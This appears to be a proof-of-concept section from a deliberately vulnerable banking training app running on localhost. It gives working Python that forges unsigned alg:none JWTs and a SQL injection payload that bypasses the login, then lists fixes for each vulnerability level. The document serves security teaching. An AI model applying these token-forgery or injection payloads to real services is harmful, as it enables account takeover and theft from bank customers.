PROOF OF CONCEPT
================================================================================

1. JWT Forgery (No Signing Required)

   import json, base64, time

   def forge_jwt(customer_id, role='user'):
       header = {"typ": "JWT", "alg": "none"}
       payload = {"sub": customer_id, "role": role, "exp": int(time.time())+3600}
       def b64url(d): return base64.urlsafe_b64encode(d.encode()).rstrip(b'=').decode()
       return b64url(json.dumps(header)) + "." + b64url(json.dumps(payload)) + "."

   token = forge_jwt("BS100234")
   # Use: http://localhost:9443/dashboard?access_token={token}

2. SQL Injection Login Bypass

   Customer ID: BS100001' #
   Password: anything
   Result: Bypasses authentication, proceeds to OTP

   Reason: Query becomes:
     SELECT ... WHERE customer_id = 'BS100001' #' AND password_md5 = MD5('anything')
     The comment (#) removes the password check

VULNERABILITY LEVELS & FIXES
================================================================================

Current Configuration: LEVEL 0 (All vulnerabilities active)

To Fix (Set to LEVEL 3):

1. auth.l12 = 3 (JWT Signature)
   Before: Accept alg:none, no signature check
   After: Require HS256 with HMAC-SHA256 signature

2. auth.l17 = 3 (JWT Claims)
   Before: Include PAN, Aadhaar, Balance in token
   After: Only sub, role, exp, iat (minimal claims)

3. auth.g1 = 3 (Login Security)
   Before: Concatenated SQL query, MD5 password
   After: Parameterized query, bcrypt password

4. auth.l11 = 3 (OTP Handling)
   Before: OTP visible in page source
   After: OTP hidden, server-side only
